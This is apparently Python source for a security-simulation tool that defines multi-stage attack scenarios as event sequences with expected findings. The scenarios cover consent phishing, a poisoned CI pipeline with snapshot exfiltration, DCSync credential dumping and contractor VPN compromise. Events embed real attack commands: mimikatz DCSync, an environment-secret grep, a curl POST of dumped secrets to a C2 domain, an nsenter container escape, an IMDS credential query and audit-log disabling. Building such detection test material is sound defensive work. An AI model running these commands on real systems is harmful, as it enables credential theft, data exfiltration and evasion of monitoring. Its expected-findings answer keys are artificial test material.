        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 30), data={"process_name": "mimikatz.exe", "action": "start", "parent_process": "diag_v2.exe", "path": "C:\\Users\\Public\\mimikatz.exe", "pid": 7220, "integrity_level": "high", "command_line": "mimikatz.exe \"lsadump::dcsync /user:CORP\\Administrator\" exit", "hash": "6c5bd5b84d208d2695396c32116d433b066c32938631637076cd62b70c31025b", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "dcsync": True, "target_account": "Administrator"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 135, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "kerberos", "bytes_sent": 4096, "bytes_received": 131072, "description": "DRSUAPI replication request — DCSync for Administrator account", "metadata": {"attack_phase": "credential_access", "dcsync": True, "drsuapi_traffic": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(3, 1.5, 0.5, 8), data={"process_name": "mimikatz.exe", "action": "start", "parent_process": "diag_v2.exe", "path": "C:\\Users\\Public\\mimikatz.exe", "pid": 7248, "integrity_level": "high", "command_line": "mimikatz.exe \"lsadump::dcsync /user:CORP\\krbtgt\" exit", "hash": "6c5bd5b84d208d2695396c32116d433b066c32938631637076cd62b70c31025b", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "dcsync": True, "target_account": "krbtgt"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 135, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "kerberos", "bytes_sent": 4096, "bytes_received": 131072, "description": "DRSUAPI replication request — DCSync for krbtgt account (golden ticket material)", "metadata": {"attack_phase": "credential_access", "dcsync": True, "drsuapi_traffic": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(3, 1.5, 0.5, 8), data={"process_name": "mimikatz.exe", "action": "start", "parent_process": "diag_v2.exe", "path": "C:\\Users\\Public\\mimikatz.exe", "pid": 7276, "integrity_level": "high", "command_line": "mimikatz.exe \"lsadump::dcsync /all /csv\" exit", "hash": "6c5bd5b84d208d2695396c32116d433b066c32938631637076cd62b70c31025b", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "dcsync": True, "full_domain_dump": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(2, 1, 0.3, 8), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 135, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "kerberos", "bytes_sent": 16384, "bytes_received": 8388608, "description": "DRSUAPI replication — full domain credential dump, large data transfer indicates all account hashes", "metadata": {"attack_phase": "credential_access", "dcsync": True, "drsuapi_traffic": True, "full_domain_dump": True}}, requires_success=True),

        # --- Phase 15: Credential dump staging and exfiltration ---
        AttackEvent(event_type="file_event", delay=_delay(2, 1, 0.3, 6), data={"action": "copy", "path": "C:\\Temp\\domain_hashes.csv", "system": "endpoint", "label": "sensitive", "category": "credential_dump", "description": "Credential dump staged to local file — all domain account NTLM hashes", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "7z.exe", "action": "start", "parent_process": "diag_v2.exe", "path": "C:\\Users\\Public\\7z.exe", "pid": 7340, "integrity_level": "high", "command_line": "7z.exe a -pInfected123 C:\\Temp\\backup.7z C:\\Temp\\domain_hashes.csv C:\\Temp\\kerberoast_hashes.txt C:\\Temp\\bh_output\\*", "hash": "44fc97b4666d6cc6d491ee396397a919f5c4fa00f96dec480204dae85230c118", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "collection", "password_protected_archive": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(3, 1.5, 0.5, 10), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 52428800, "bytes_received": 2048, "description": "Credential dump exfiltration — 50 MB password-protected archive uploaded to C2 over HTTPS", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
    ],
    parameters=_COMPOUND_BASE_PARAMS,
    success_rate=0.4,
    iocs=["microsoft-device-verify.com", "cdn-static-assets.com"],
    expected_findings=["Device-code phishing — OAuth token granted to attacker", "OAuth token replay from foreign IP", "RAT deployed to colleague via Teams lure", "AD enumeration via SharpHound", "DCSync full domain credential dump — DRSUAPI replication from workstation", "Credential dump exfiltrated"],
    relevant_ioc_keys=["attacker_email", "attacker_ip", "c2_domain"],
)

CONSENT_PHISHING_TO_SLOW_EXFIL = AttackScenario(
    id="consent_phishing_to_slow_exfil",
    tier="T3",
    name="OAuth Consent Phishing to Slow-Drip Data Exfiltration",
    description="Attacker sends consent phishing email for malicious OAuth app. Victim grants consent, registering a service principal with broad Graph API permissions. Attacker adds client secret for persistence and returns via client_credentials flow to enumerate accessible resources. Over the following days attacker exports mailboxes and SharePoint data, suppresses audit logging and deletes SIEM sinks, then conducts slow-drip exfiltration in small HTTPS batches spread across a week with multi-hour gaps between transfers to avoid detection.",
    attack_type="consent_phishing",
    events=[
        # =====================================================================
        # DAY 1 — Consent phishing, service principal registration, persistence
        # =====================================================================
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "{subject}", "content": "{email_body}", "external": True, "contains_url": "{phishing_url}", "metadata": {"is_malicious": True, "attack_phase": "delivery"}}, requires_success=False),
        AttackEvent(event_type="app_event", delay=_delay(20, 12, 3, 90), data={"app": "Azure AD", "action": "grant_oauth_consent", "resource_name": "Analytics Connector Pro", "success": True, "description": "Victim granted broad OAuth consent — Mail.Read, Files.Read.All, Sites.Read.All, User.Read.All permissions", "metadata": {"attack_phase": "exploitation", "oauth_consent_granted": True}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(5, 3, 1, 20), "data": {"app": "Azure AD", "action": "deny_oauth_consent", "description": "User denied consent", "success": True}}),
        AttackEvent(event_type="app_event", delay=_delay(1, 0.3, 0.2, 3), data={"app": "Azure AD", "action": "register_service_principal", "resource_name": "Analytics Connector Pro", "success": True, "description": "Malicious service principal registered in tenant", "metadata": {"attack_phase": "persistence"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "Azure AD", "action": "add_client_secret", "resource_name": "Analytics Connector Pro", "success": True, "description": "Client secret added to service principal for persistent non-interactive access", "metadata": {"attack_phase": "persistence"}}, requires_success=True),
        # Immediate test login via client_credentials to verify access
        AttackEvent(event_type="login", delay=_delay(5, 2, 1, 15), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "service_principal", "known_device": False, "user_agent": "python-requests/2.28.0", "method": "client_credentials", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True, "service_principal_login": True, "initial_test": True}}, requires_success=True),
        # =====================================================================
        # DAY 2 — Return via client_credentials, enumerate resources, initial collection
        # =====================================================================
        AttackEvent(event_type="login", delay=_delay(1440, 480, 720, 2880), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "service_principal", "known_device": False, "user_agent": "python-requests/2.28.0", "method": "client_credentials", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True, "service_principal_login": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "Microsoft Graph API", "action": "list_mailboxes", "resource_type": "mailbox", "resource_name": "GET /users?$select=mail,displayName,jobTitle", "success": True, "description": "Enumerated all accessible user mailboxes via Graph API", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "Microsoft Graph API", "action": "list_sites", "resource_type": "site", "resource_name": "GET /sites?search=*", "success": True, "description": "Enumerated all SharePoint sites accessible to the service principal", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 2, 1, 15), data={"app": "Microsoft Graph API", "action": "list_messages", "resource_type": "mailbox", "resource_name": "GET /users/cfo@company.com/messages?$top=50&$search='confidential'", "success": True, "description": "Listed messages in CFO mailbox searching for confidential content", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "Microsoft Graph API", "action": "list_drive_items", "resource_type": "site", "resource_name": "GET /sites/finance/drive/root/children", "success": True, "description": "Listed top-level items on Finance SharePoint site drive", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        # =====================================================================
        # DAY 3 — Bulk mailbox and SharePoint exports
        # =====================================================================
        AttackEvent(event_type="login", delay=_delay(1440, 480, 720, 2880), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "service_principal", "known_device": False, "user_agent": "python-requests/2.28.0", "method": "client_credentials", "metadata": {"attack_phase": "collection", "is_attacker": True, "return_session": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 2, 1, 15), data={"app": "Exchange Online (Graph API)", "action": "export_mailbox", "resource_type": "mailbox", "resource_name": "GET /users/cfo@company.com/messages — all pages", "success": True, "description": "Bulk export of CFO mailbox via Graph API pagination", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "Exchange Online (Graph API)", "action": "export_mailbox", "resource_type": "mailbox", "resource_name": "GET /users/ceo@company.com/messages — all pages", "success": True, "description": "Bulk export of CEO mailbox via Graph API pagination", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "Exchange Online (Graph API)", "action": "export_mailbox", "resource_type": "mailbox", "resource_name": "GET /users/legal-counsel@company.com/messages — all pages", "success": True, "description": "Bulk export of Legal Counsel mailbox via Graph API pagination", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 2, 1, 15), data={"app": "SharePoint Online (Graph API)", "action": "list_all_items", "resource_type": "document_library", "resource_name": "GET /sites/finance/drive/root:/Quarterly Reports:/children", "success": True, "description": "Bulk listing of Finance Quarterly Reports document library", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "SharePoint Online (Graph API)", "action": "list_all_items", "resource_type": "document_library", "resource_name": "GET /sites/executive/drive/root:/Board Materials:/children", "success": True, "description": "Bulk listing of Executive Board Materials document library", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        # =====================================================================
        # DAY 5 — Suppress audit logging and delete SIEM sinks
        # =====================================================================
        AttackEvent(event_type="login", delay=_delay(2880, 960, 1440, 5760), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "service_principal", "known_device": False, "user_agent": "python-requests/2.28.0", "method": "client_credentials", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True, "return_session": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 2, 1, 15), data={"app": "Microsoft Purview", "action": "disable_audit_log", "resource_name": "UnifiedAuditLog", "success": True, "description": "Unified Audit Log disabled to suppress future activity traces", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 1, 0.5, 10), data={"app": "Azure Monitor", "action": "delete_diagnostic_setting", "resource_name": "SIEM-Export-Sink", "success": True, "description": "SIEM log export sink deleted — events no longer forwarded to SIEM", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 6), data={"app": "Azure Monitor", "action": "delete_diagnostic_setting", "resource_name": "AAD-SignIn-Logs-Export", "success": True, "description": "Azure AD sign-in log diagnostic setting deleted", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        # =====================================================================
        # DAY 7-10 — Slow-drip exfiltration over multiple sessions
        # =====================================================================
        AttackEvent(event_type="login", delay=_delay(2880, 960, 1440, 5760), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "service_principal", "known_device": False, "user_agent": "python-requests/2.28.0", "method": "client_credentials", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "return_session": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(30, 15, 10, 60), data={"source_ip": "{attacker_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 76800, "bytes_received": 512, "description": "Slow-drip exfil batch 1 — 75 KB HTTPS transfer (CFO mailbox subset)", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "slow_drip": True, "batch_number": 1}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(180, 60, 90, 360), data={"source_ip": "{attacker_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 92160, "bytes_received": 512, "description": "Slow-drip exfil batch 2 — 90 KB HTTPS transfer (CEO mailbox subset), 3 hours later", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "slow_drip": True, "batch_number": 2}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(1440, 480, 720, 2880), data={"source_ip": "{attacker_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 61440, "bytes_received": 256, "description": "Slow-drip exfil batch 3 — 60 KB HTTPS transfer (legal counsel mailbox subset), next day", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "slow_drip": True, "batch_number": 3}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(240, 90, 120, 480), data={"source_ip": "{attacker_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 102400, "bytes_received": 512, "description": "Slow-drip exfil batch 4 — 100 KB HTTPS transfer (finance SharePoint docs), 4 hours later", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "slow_drip": True, "batch_number": 4}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(2880, 960, 1440, 5760), data={"source_ip": "{attacker_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 81920, "bytes_received": 256, "description": "Slow-drip exfil batch 5 — 80 KB HTTPS transfer (board materials), 2-day gap", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "slow_drip": True, "batch_number": 5}}, requires_success=True),
        # =====================================================================
        # DAY 12-14 — Final exfil batches
        # =====================================================================
        AttackEvent(event_type="network_event", delay=_delay(2880, 960, 1440, 5760), data={"source_ip": "{attacker_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 102400, "bytes_received": 512, "description": "Slow-drip exfil batch 6 — 100 KB HTTPS transfer (remaining executive mailbox data), 2-day gap", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "slow_drip": True, "batch_number": 6}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(2880, 960, 1440, 5760), data={"source_ip": "{attacker_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 122880, "bytes_received": 512, "description": "Slow-drip exfil batch 7 — final 120 KB HTTPS transfer (remaining SharePoint docs), campaign complete — total ~720 KB over 14 days", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "slow_drip": True, "batch_number": 7, "final_batch": True}}, requires_success=True),
    ],
    parameters=_COMPOUND_BASE_PARAMS,
    success_rate=0.4,
    iocs=["azure-app-marketplace.com"],
    expected_findings=["OAuth consent phishing — broad Graph API permissions granted", "Service principal with client secret for persistent access", "Bulk mailbox and SharePoint data collected via Graph API", "Audit logging disabled and SIEM sinks deleted", "Slow-drip exfiltration over 14 days via service principal"],
    relevant_ioc_keys=["attacker_email", "attacker_domain", "phishing_url", "attacker_ip"],
)

POISONED_PIPELINE_TO_SNAPSHOT_EXPORT = AttackScenario(
    id="poisoned_pipeline_to_snapshot_export",
    tier="T3",
    name="Poisoned CI Pipeline to VM Snapshot Exfiltration",
    description="Attacker submits malicious PR that poisons a CI pipeline step. When the pipeline runs, it dumps environment variables and steals cloud secrets, exfiltrating them to C2. Attacker uses stolen AWS credentials to log into the cloud, performs IAM recon, creates a privileged IAM role with EC2+EBS permissions. Next day attacker returns, deploys a privileged container, escapes to the host via nsenter, enumerates EBS volumes, creates snapshots of production database and application server volumes, shares them with an attacker AWS account, and exports them to an attacker-controlled S3 bucket.",
    attack_type="supply_chain",
    events=[
        # =====================================================================
        # DAY 1 — Malicious PR, CI pipeline poisoning, secret theft, cloud login
        # =====================================================================
        AttackEvent(event_type="app_event", delay=_delay(0, 0), data={"app": "GitHub Actions", "action": "submit_pull_request", "resource_name": "fix: update CI runner cache", "success": True, "description": "Malicious PR submitted with poisoned CI step hidden in build script", "metadata": {"attack_phase": "initial_access"}}, requires_success=False),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 20), data={"app": "GitHub Actions", "action": "pipeline_triggered", "resource_name": "ci-build-test.yml", "success": True, "description": "CI pipeline triggered by PR — build and test workflow started", "metadata": {"attack_phase": "execution"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.3, 8), data={"process_name": "sh", "action": "start", "parent_process": "runner", "path": "/usr/bin/sh", "pid": 1842, "integrity_level": "high", "command_line": "sh -c 'printenv | grep -iE \"TOKEN|SECRET|KEY|AWS\" | base64 -w0'", "hash": "b1c7fa4dd9345b5f8d2f20d5c7524bc33cd3bddeafad4e9ff01049e7f15b2b2f", "user_context": "runner", "metadata": {"attack_phase": "execution", "env_dump": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"app": "GitHub Actions", "action": "access_secret", "resource_name": "AWS_ACCESS_KEY_ID", "success": True, "description": "CI secret AWS_ACCESS_KEY_ID accessed during pipeline run", "metadata": {"attack_phase": "credential_access"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(0.2, 0.1, 0.05, 1), data={"app": "GitHub Actions", "action": "access_secret", "resource_name": "AWS_SECRET_ACCESS_KEY", "success": True, "description": "CI secret AWS_SECRET_ACCESS_KEY accessed during pipeline run", "metadata": {"attack_phase": "credential_access"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"app": "AWS Secrets Manager", "action": "get_secret_value", "resource_name": "prod/database/credentials", "success": True, "description": "Queried Secrets Manager for production database credentials from CI runner", "metadata": {"attack_phase": "credential_access", "secrets_manager_query": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "curl", "action": "start", "parent_process": "sh", "path": "/usr/bin/curl", "pid": 1856, "integrity_level": "high", "command_line": "curl -s -X POST -d @/tmp/.env_dump https://cdn-static-assets.com/ci_exfil", "hash": "49a0f14739c2c9da000398cf882b21fb7c42848aab253d3bc0ced87f0fc282b6", "user_context": "runner", "metadata": {"attack_phase": "exfiltration", "c2_exfil": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 4096, "bytes_received": 256, "description": "CI runner exfiltrated stolen secrets to C2 endpoint via HTTPS POST", "metadata": {"attack_phase": "exfiltration", "c2_exfil": True}}, requires_success=True),
        AttackEvent(event_type="login", delay=_delay(15, 8, 3, 60), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "aws-cli/2.9.0", "method": "APIKey", "metadata": {"attack_phase": "initial_access", "is_attacker": True, "stolen_credentials": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "AWS IAM", "action": "list_roles", "resource_name": "iam:ListRoles", "success": True, "description": "Enumerated existing IAM roles to understand current permissions landscape", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "AWS IAM", "action": "list_policies", "resource_name": "iam:ListAttachedUserPolicies", "success": True, "description": "Enumerated policies attached to compromised user — identified EC2 and IAM permissions", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 2, 1, 20), data={"app": "AWS IAM", "action": "create_iam_role", "resource_name": "lambda-ebs-backup-role", "success": True, "description": "Created IAM role with EC2FullAccess and EBS snapshot permissions — named to blend with backup operations", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 6), data={"app": "AWS IAM", "action": "get_role", "resource_name": "lambda-ebs-backup-role", "success": True, "description": "Verified newly created IAM role and its attached policies", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),
        # =====================================================================
        # DAY 2 — Deploy privileged container, escape, enumerate volumes, snapshot
        # =====================================================================
        AttackEvent(event_type="login", delay=_delay(1440, 480, 720, 2880), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "aws-cli/2.9.0", "method": "APIKey", "metadata": {"attack_phase": "execution", "is_attacker": True, "return_session": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 30), data={"app": "AWS ECS", "action": "deploy_container", "resource_name": "ubuntu:20.04", "success": True, "description": "Privileged container deployed with --privileged flag and host PID namespace", "metadata": {"attack_phase": "execution", "is_attacker": True, "privileged_container": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(3, 1, 0.5, 10), data={"process_name": "nsenter", "action": "start", "parent_process": "sh", "path": "/usr/bin/nsenter", "pid": 1, "integrity_level": "high", "command_line": "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash", "hash": "9da09a53b800975169af0e57f318a14e01aad482bee7d5da6286c6df2680ffd3", "user_context": "root", "metadata": {"attack_phase": "privilege_escalation", "container_escape": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.3, 6), data={"process_name": "hostname", "action": "start", "parent_process": "bash", "path": "/usr/bin/hostname", "pid": 2104, "integrity_level": "high", "command_line": "hostname -f", "hash": "c3407a71c0a015af24a4a25d5f4d24982fadf08727fba04fc079e6650195e652", "user_context": "root", "metadata": {"attack_phase": "discovery", "container_escape": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "curl", "action": "start", "parent_process": "bash", "path": "/usr/bin/curl", "pid": 2108, "integrity_level": "high", "command_line": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/", "hash": "49a0f14739c2c9da000398cf882b21fb7c42848aab253d3bc0ced87f0fc282b6", "user_context": "root", "metadata": {"attack_phase": "discovery", "imds_query": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "AWS EC2", "action": "describe_volumes", "resource_name": "ec2:DescribeVolumes", "success": True, "description": "Enumerated all EBS volumes — identified prod-db (500 GB) and app-server (200 GB)", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 2, 1, 15), data={"app": "AWS EC2", "action": "create_snapshot", "resource_name": "snap-prod-db-vol-0a1b2c3d4e5f", "success": True, "description": "Created snapshot of production database EBS volume (vol-0a1b2c3d — 500 GB)", "metadata": {"attack_phase": "collection", "is_attacker": True, "target_volume": "prod-db"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 1.5, 0.5, 10), data={"app": "AWS EC2", "action": "modify_snapshot_attribute", "resource_name": "snap-prod-db-vol-0a1b2c3d4e5f", "success": True, "description": "Shared production DB snapshot with attacker AWS account (123456789012)", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "cross_account_share": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "AWS EC2", "action": "create_volume_from_snapshot", "resource_name": "vol-attacker-prod-db-copy", "success": True, "description": "Created EBS volume from shared snapshot in attacker account", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "cross_account_copy": True}}, requires_success=True),
        # =====================================================================
        # DAY 3 — Return, snapshot app server, export to attacker S3
        # =====================================================================
        AttackEvent(event_type="login", delay=_delay(1440, 480, 720, 2880), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "aws-cli/2.9.0", "method": "APIKey", "metadata": {"attack_phase": "collection", "is_attacker": True, "return_session": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 2, 1, 15), data={"app": "AWS EC2", "action": "create_snapshot", "resource_name": "snap-app-server-vol-6f7g8h9i0j", "success": True, "description": "Created snapshot of application server EBS volume (vol-6f7g8h — 200 GB)", "metadata": {"attack_phase": "collection", "is_attacker": True, "target_volume": "app-server"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "AWS EC2", "action": "export_snapshot", "resource_name": "s3://attacker-exfil-bucket/prod-db-snapshot.vmdk", "success": True, "description": "Exported production DB snapshot to attacker-controlled S3 bucket as VMDK", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 25), data={"app": "AWS EC2", "action": "export_snapshot", "resource_name": "s3://attacker-exfil-bucket/app-server-snapshot.vmdk", "success": True, "description": "Exported application server snapshot to attacker-controlled S3 bucket as VMDK", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(30, 15, 5, 120), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 536870912000, "bytes_received": 8192, "description": "Massive outbound transfer — production DB snapshot (500 GB) exported to external S3 bucket", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "snapshot_exfil": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(20, 10, 5, 60), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 214748364800, "bytes_received": 4096, "description": "Continued outbound transfer — application server snapshot (200 GB) exported to external S3 bucket", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "snapshot_exfil": True}}, requires_success=True),
    ],
    parameters=_COMPOUND_BASE_PARAMS,
    success_rate=0.35,
    iocs=["cdn-static-assets.com"],
    expected_findings=["Malicious PR poisoned CI pipeline build step", "CI secrets stolen and exfiltrated", "Privileged IAM role created with EC2+EBS permissions", "Container escape via nsenter to host namespace", "Production snapshots exported to attacker S3 bucket (700+ GB)"],
    relevant_ioc_keys=["attacker_ip", "c2_domain"],
)

CONTRACTOR_VPN_TO_EDISCOVERY = AttackScenario(
    id="contractor_vpn_to_ediscovery",
    tier="T3",
    name="Contractor VPN Compromise to eDiscovery Mass Export",
    description="Compromised contractor VPN account used for network recon, lateral movement to domain-joined workstation, AD CS certificate abuse for privilege escalation, hybrid identity sync manipulation for cloud admin, then eDiscovery mass export over multiple days.",
    attack_type="privilege_escalation",
    events=[
        # =====================================================================
        # DAY 1 — VPN access, network reconnaissance, lateral movement
        # =====================================================================
        # Initial access via compromised contractor VPN
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "Cisco AnyConnect/4.10", "method": "VPN+Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True, "vpn_login": True, "impossible_travel": True}}, requires_success=False),
        # Network reconnaissance — scan internal subnets
        AttackEvent(event_type="network_event", delay=_delay(10, 5, 2, 30), data={"source_ip": "{attacker_ip}", "destination_ip": "10.0.0.0", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "none", "bytes_sent": 65536, "bytes_received": 131072, "description": "SMB port scan across internal subnet from VPN IP", "metadata": {"attack_phase": "discovery", "network_scan": True}}, requires_success=True, pre_attempts={"count_range": [10, 30], "delay": _delay(0.1, 0.05, 0.01, 0.3), "data_overrides": {"action": "blocked", "description": "Scan probe blocked"}}),
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{attacker_ip}", "destination_ip": "10.0.1.0", "destination_port": 3389, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "none", "bytes_sent": 32768, "bytes_received": 65536, "description": "RDP port scan on server subnet from VPN IP", "metadata": {"attack_phase": "discovery", "network_scan": True}}, requires_success=True),
